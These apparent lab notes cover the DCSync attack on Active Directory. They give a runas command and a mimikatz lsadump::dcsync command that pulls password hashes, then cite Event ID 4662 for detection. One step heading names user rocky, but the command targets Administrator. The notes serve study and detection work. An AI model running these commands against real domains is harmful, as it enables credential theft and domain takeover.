# DCSync Attack

DCSync is an attack that threat agents utilize to impersonate a Domain Controller to extract password hashes from Active Directory.

## 1. Run cmd.exe from another domain user (rocky), to extract rocky hash

```
runas.exe /user:eagle\rocky cmd.exe
```

## 2. Use mimikatz.exe to pretend as Domain Controller and extract the rocky hash

```
.\mimikatz.exe
mimikatz> lsadump::dcsync /domain:eagle.local /dc:DC1.eagle.local /user:Administrator
```

# Detect 
## Event ID 4662

An operation was performed on an object

This event is commonly associated with:

Active Directory object access
LDAP operations
Permission changes
DCSync detection
Directory replication activity
